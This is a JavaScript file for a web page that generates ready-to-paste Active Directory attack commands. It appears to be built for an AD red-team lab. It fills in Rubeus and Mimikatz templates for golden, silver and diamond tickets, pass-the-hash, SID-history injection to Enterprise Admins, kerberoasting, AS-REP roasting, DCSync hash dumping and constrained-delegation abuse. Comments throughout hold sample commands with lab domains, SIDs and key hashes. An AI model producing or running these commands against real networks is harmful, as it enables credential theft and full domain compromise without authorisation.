// Global
var tool = "rubeus.exe";
var toolsPath = getCookie('tools-path') || '';
var parentDomain = getCookie('parent-domain') || '';
var currentDomain = getCookie('current-domain') || '';
var currentDomainSID = getCookie('current-sid') || '';
var parentDomainSID = getCookie('parent-sid') || '';
var krbtgt = getCookie('krbtgt') || '';

console.log("Tool:", tool);
console.log("Tools Path:", toolsPath);
console.log("Parent Domain:", parentDomain);
console.log("Current Domain:", currentDomain);
console.log("Current Domain SID:", currentDomainSID);
console.log("Parent Domain SID:", parentDomainSID);
console.log("Krbtgt:", krbtgt);

// Prevent Default for all forms
var forms = document.getElementsByTagName("form");
for (var i = 0; i < forms.length; i++) {
	forms[i].addEventListener('submit', function(event) {
		event.preventDefault();
	});
}

// Add event listeners to the tool buttons to set the 'tool' variable based on the selected tool
document.querySelectorAll('#tool-btn').forEach((radioButton) => {
	radioButton.addEventListener('click', function() {
		// Get 'data-tool' value
		tool = this.getAttribute('data-tool').toLowerCase();
	});
});

// Function to generate command based on the active tab
document.querySelectorAll('#generate-command').forEach(function(element) {
	element.addEventListener('click', function(event) {
		event.preventDefault();
		form_id = event.target.parentNode.parentNode.id;
		var activeTab = document.querySelector('.nav-tabs .active').getAttribute('href'); // Get ID of active tab
		console.log(form_id)
		
		if (activeTab === "#nav-cross-forest") {
			generateCrossForestCommand();
		} else if (activeTab === "#nav-inter-forest") {
			generateInterForestCommand(form_id);
		} else if (activeTab === "#nav-kerberor-tickets") {
			generateKerberosTicketsCommand(form_id);
		} else if (activeTab === "#nav-dump-hashes") {
			generateDumpHashesCommand();
		} else if (activeTab === "#nav-kerberoast") {
			generateKerberoastCommand(form_id);
		} else if (activeTab === "#nav-delegation") {
			generateDelegationCommand(form_id);
		}
	});
});

// Function to generate command for Cross Forest tab
function generateCrossForestCommand(form_id) {
	let rc4 = document.querySelector("#form-cross-tgt #trust-ntlm")?.value ?? "";
	let aes256 = document.querySelector("#form-cross-tgt #trust-aes")?.value ?? "";
	let user = document.querySelector("#form-cross-tgt #user")?.value ?? "";
	// let endin = document.querySelector("#form-silver #endin").value;
	// let renewmax = document.querySelector("#form-silver #renewmax").value;
	let currentDomain = (window.currentDomain || document.querySelector("#form-cross-tgt #current-domain")?.value) ?? "";
	let currentDomainSID = (window.currentDomainSID || document.querySelector("#form-cross-tgt #current-sid")?.value) ?? "";
	let serviceSPN = document.querySelector("#form-cross-tgs #service")?.value ?? "";
	let dc = document.querySelector("#form-cross-tgs #dc")?.value ?? "";
	let ticket = document.querySelector("#form-cross-tgs #ticket")?.value ?? "";

	// flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /target:${targetDomain} /service:${service} /rc4:${rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

	// if (tool == "invoke-mimikatz") {
	// 	command = `${tool} -Command '${flags}'`;
	// } else if (tool == "rubeus.exe") {
	// 	// Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /aes256:4b3d9c78a58e13dba8366da47a490c00dfacbfe0d5b82a710fb463ca3238a093 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap

	// }

	commandTGT = `${toolsPath}rubeus.exe silver /user:${user} /domain:${currentDomain} /service:KRBTGT/${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /ldap /ptt /nowrap`;

	commandTGS = `${toolsPath}rubeus.exe asktgs /user:${user} /service:${serviceSPN} /dc:${dc} /ptt /ticket:${ticket}`;

	if (form_id == "form-cross-tgt")
		document.querySelector("#command-cross-tgt").value = commandTGT;
	else if (form_id == "form-cross-tgs")
		document.querySelector("#command-cross-tgs").value = commandTGS;
}

// Function to generate command for Inter Forest tab
function generateInterForestCommand() {
	let rc4 = (window.krbtgt ||document.querySelector("#form-sid-injection #trust-ntlm")?.value) ?? "";
	let aes256 = document.querySelector("#form-sid-injection #trust-aes")?.value ?? "";
	let user = document.querySelector("#form-sid-injection #user")?.value ?? "";
	let uid = document.querySelector("#form-sid-injection #uid")?.value ?? "";
	let currentDomain = (window.currentDomain || document.querySelector("#form-sid-injection #current-domain")?.value) ?? "";
	let targetDomain = (window.parentDomain || document.querySelector("#form-sid-injection #target-domain")?.value) ?? "";
	let currentDomainSID = (window.currentDomainSID || document.querySelector("#form-sid-injection #current-sid")?.value) ?? "";
	let parentDomainSID = (window.parentDomainSID || document.querySelector("#form-sid-injection #parent-sid")?.value) ?? "";
	let enterpriseAdminSid = parentDomainSID + "-519"; // Enterprise Admins
	let service = document.querySelector("#form-sid-injection #service")?.value ?? "";
	let ticketPath = document.querySelector("#form-sid-injection #ticket-path")?.value ?? "";
	let netbios = document.querySelector("#form-sid-injection #netbios")?.value ?? " ";
	let dc = document.querySelector("#form-sid-injection #dc")?.value ?? " ";
	
	// Flags
	if (aes256) {
		katz_flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /service:${service} /aes256:${aes256} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;
		
		// Inter realm TGT
		rubeus_tgt_flags = `silver /user:${user} /service:${service} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /aes256:${aes256} /krbenctype:aes /ldap /nowrap`
		
		// TGS
		rubeus_tgs_flags = `asktgs /user:${user} /service:${service} /dc:${dc} /ptt /ticket:${ticketPath}`
	}
	
	if (rc4) {
		katz_flags = `"asktgt /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /service:${service} /rc4:${rc4} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;
		
		rubeus_krbtgt_flags = `"asktgt /user:${user} /id:${uid} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${enterpriseAdminSid} /rc4:${rc4} /netbios:${netbios} /ptt" "exit"`
	}
	
	// Full commands
	if (tool == "invoke-mimikatz") {
		krbtgtCommand = `Invoke-Mimikatz -Command '${katz_flags}'`;
	} else if (tool == "rubeus.exe") {
		
		krbtgtCommand = `${toolsPath}${tool} ${rubeus_krbtgt_flags}`;
		
		if (aes256) {
			interTGTCommand = `${toolsPath}${tool} ${rubeus_tgt_flags}`;
			interTGSCommand = `${toolsPath}${tool} ${rubeus_tgs_flags}`;
		}
	} else {
		krbtgtCommand = `${toolsPath}${tool} ${katz_flags}`;
	}
	
	document.querySelector("#command-inter-krbtgt").value = krbtgtCommand;	
	document.querySelector("#command-inter-tgt").value = interTGTCommand;	
	document.querySelector("#command-inter-tgs").value = interTGSCommand;	
	
}

// Function to generate command for Kerberos Tickets tab
function generateKerberosTicketsCommand(form_id) {
	if (form_id == "form-silver") {
		let user = document.querySelector("#form-silver #user").value;
		let currentDomain = (window.currentDomain || document.querySelector("#form-silver #target-domain")?.value) ?? "";
		let serviceSPN = document.querySelector("#form-silver #service").value;
		let rc4 = document.querySelector("#form-silver #rc4").value;
		let aes256 = document.querySelector("#form-silver #aes256").value;
		let startoffset = document.querySelector("#form-silver #startoffset").value;
		let endin = document.querySelector("#form-silver #endin").value;
		let renewmax = document.querySelector("#form-silver #renewmax").value;
		let currentDomainSID = (window.currentDomainSID || document.querySelector("#form-silver #current-domain-sid")?.value) ?? "";
		
		// SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:c6a60b67476b36ad7838d7875c33c2c3 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
		
		var s = serviceSPN.split("/");
		var service = s[0];
		var targetHost = s[1];
		
		flags = `"kerberos::golden /user:${user} /domain:${currentDomain} /sid:${currentDomainSID} /target:${targetHost} /service:${service} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
		
		if (tool == "invoke-mimikatz") {
			command = `$${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
			
			command = `${toolsPath}${tool} silver /user:${user} /domain:${currentDomain} /service:${serviceSPN} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /ldap  /ptt`;
		}
		else {
			command = `${toolsPath}${tool} ${flags}`;
		}
		document.querySelector("#command-silver").value = command;
		
	} else if (form_id == "form-golden") {
		let user = document.querySelector("#form-golden #user").value;
		let targetDomain = (window.currentDomain || document.querySelector("#form-golden #current-domain")?.value) ?? "";
		let currentDomainSID = (window.currentDomain || document.querySelector("#form-global #current-sid")?.value) ?? "";
		let rc4 = document.querySelector("#form-golden #rc4")?.value ?? "";
		let aes256 = document.querySelector("#form-golden #aes256")?.value ?? "";
		let startoffset = document.querySelector("#form-golden #startoffset").value;
		let endin = document.querySelector("#form-golden #endin").value;
		let renewmax = document.querySelector("#form-golden #renewmax").value;

		//  C:\ad\Tools\betterSafetyKatz.exe "kerberos::golden /user:Administrator /rc4:2368c4a2a27b01d0118cb809352f17be /domain:dollarcorp.moneycorp.local / /sid:S-1-5-21-719815819-3726368948-391768864 /ptt" "exit"
		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
		
		if (tool == "invoke-mimikatz") {
			command = `${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd /ptt
			
			command = `${toolsPath}${tool} golden /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /ldap /user:${user} /printcmd /ptt`;
		} else {
			command = `${toolsPath}${tool} ${flags}`;
		}
		
		document.querySelector("#command-golden").value = command;
	} else if (form_id == "form-pth") {
		let user = document.querySelector("#form-pth #user").value;
		let currentDomain = (window.currentDomain || document.querySelector("#form-global #current-domain")?.value )?? "";
		let aes256 = document.querySelector("#form-pth #aes256").value;
		let startoffset = document.querySelector("#form-pth #startoffset").value;
		let endin = document.querySelector("#form-pth #endin").value;
		let renewmax = document.querySelector("#form-pth #renewmax").value;
		let rc4 = document.querySelector("#form-pth #rc4").value;
		
		// C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit"
		
		flags = `"sekurlsa::pth /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /run:C:\\Windows\\System32\\cmd.exe" "exit"`;
		
		if (tool == "invoke-mimikatz") {
			command = `${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe asktgt /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
			
			command = `${toolsPath}${tool} asktgt /user:${user} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
		} else {
			command = `${toolsPath}${tool} ${flags}`;
		}
		
		document.querySelector("#command-pth").value = command;
	} else if (form_id == "form-diamond") {
		let user = document.querySelector("#form-diamond #user").value;
		let currentDomain = (window.currentDomain || document.querySelector("#form-diamond #target-domain")?.value) ?? "";
		let aes256 = document.querySelector("#form-diamond #aes256").value;
		let startoffset = document.querySelector("#form-diamond #startoffset").value;
		let endin = document.querySelector("#form-diamond #endin").value;
		let renewmax = document.querySelector("#form-diamond #renewmax").value;
		let gid = document.querySelector("#form-diamond #gid").value;
		let uid = document.querySelector("#form-diamond #uid").value;
		let dc = document.querySelector("#form-diamond #dc").value;
		
		flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
		
		if (tool == "invoke-mimikatz") {
			command = `${tool} -Command '${flags}'`;
		} else if (tool == "rubeus.exe") {
			// Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
			
			command = `${toolsPath}${tool} diamond /krbkey:${aes256} /tgtdeleg /enctype:aes /ticketuser:${user} /domain:${currentDomain} /dc:${dc} /ticketuserid:${uid} /groups:${gid} /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
		} else {
			command = `${toolsPath}${tool} ${flags}`;
		}
		
		document.querySelector("#command-diamond").value = command;
		console.log(command)
		
	}
}

function generateKerberoastCommand(form_id) {
	
	if (form_id == "form-kerberoast") {
		var user = document.querySelector("#form-kerberoast #spn").value;
		var outfile = document.querySelector("#form-kerberoast #outfile").value;
		
		var flags = `kerberoast /user:${user} /simple /format:hashcat /rc4opsec /tgtdeleg /outfile:${outfile}`;
		
		document.querySelector("#command-kerberoast").value = `${toolsPath}rubeus.exe ${flags}`;
	} else if (form_id == "form-asreproast") {
		var spn = document.querySelector("#form-asreproast #user").value;
		var outfile = document.querySelector("#form-asreproast #outfile").value;
		
		var flags = `asreproast /user:${spn} /format:hashcat /outfile:${outfile}`;
		
		document.querySelector("#command-asreproast").value = `${toolsPath}rubeus.exe ${flags}`;
	}
}

// Funtion to generateDumpHashesCommand
function generateDumpHashesCommand() {
	var user = document.querySelector("#form-dc-sync #user").value;
	var netbios = document.querySelector("#form-dc-sync #netbios").value;
	
	var flags = `"lsadump::dcsync /user:${netbios}\\${user}" "exit"`;
	
	if (tool == "invoke-mimikatz") {
		var command = `${tool} -Command '${flags}'`;
	} else {
		var command = `${toolsPath}${tool} ${flags}`;
	}
	
	document.querySelector("#command-dump-hashes").value = command;
}

// Delegation
function generateDelegationCommand(form_id) {
	// Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
	
	if (form_id == "form-constrained") {
		
		let user = document.querySelector("#form-constrained #user").value;
		let aes256 = document.querySelector("#form-constrained #aes256").value;
		let impersonateUser = document.querySelector("#form-constrained #impersonateuser").value;
		let msdsspn = document.querySelector("#form-constrained #msdsspn").value;
		let altservice = document.querySelector("#form-constrained #altservice").value;
		
		var flags = `s4u /user:${user} /aes256:${aes256} /impersonateuser:${impersonateUser} /msdsspn:${msdsspn} ${altservice ? '/altservice:' + altservice : ''} /ptt`;
		
		var command = `${toolsPath}rubeus.exe ${flags}`;
		
		document.querySelector("#command-constrained").value = command;
	}
}

// Function to set cookies
function setCookie(name, value, days) {
	var expires = "";
	if (days) {
		var date = new Date();
		date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
		expires = "; expires=" + date.toUTCString();
	}
	document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Function to get cookies
function getCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) === ' ') c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
	}
	return null;
}

// Function to update cookie value and form input value
function updateCookieAndInput(event) {
	var input = event.target;
	setCookie(input.id, input.value, 30);
}

// Function to fill form inputs with cookie values
function fillFormInputs() {
	document.getElementById('parent-domain').value = parentDomain;
	document.getElementById('current-domain').value = currentDomain;
	document.getElementById('current-sid').value = currentDomainSID;
	document.getElementById('parent-sid').value = parentDomainSID;
	document.getElementById('krbtgt').value = krbtgt;
	document.getElementById('tools-path').value = toolsPath;
}

// Clipboard
function copyToClipboard(button) {
	var commandInput = button.parentElement.previousElementSibling;
	navigator.clipboard.writeText(commandInput.value);
}

// Call fillFormInputs function when the page loads
window.onload = fillFormInputs;

// Add event listeners to form inputs to update cookies and form inputs when the user types
document.getElementById('form-global').addEventListener('input', updateCookieAndInput);